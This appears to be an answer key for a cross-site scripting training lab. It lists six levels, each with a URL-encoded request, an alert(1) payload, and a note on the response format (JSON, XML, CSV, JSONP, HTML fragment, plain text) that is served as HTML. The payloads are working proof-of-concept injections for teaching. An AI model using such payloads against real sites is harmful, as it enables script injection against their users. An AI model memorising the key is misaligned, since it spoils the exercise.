# api-response — solutions

Non-HTML response shapes (JSON/XML/CSV/JSONP) served with text/html so the body is parsed as HTML.

### api-response-level1

`/api-response/level1/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: JSON body, text/html content-type — HTML inside JSON string parses

### api-response-level2

`/api-response/level2/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: XML body, text/html content-type — browser renders as HTML

### api-response-level3

`/api-response/level3/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: CSV body served as text/html

### api-response-level4

`/api-response/level4/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: JSONP body served as text/html — HTML inside string is parsed

### api-response-level5

`/api-response/level5/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: HTML fragment inside <div class="result">

### api-response-level6

`/api-response/level6/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: plain text "Error: …" body, served as text/html
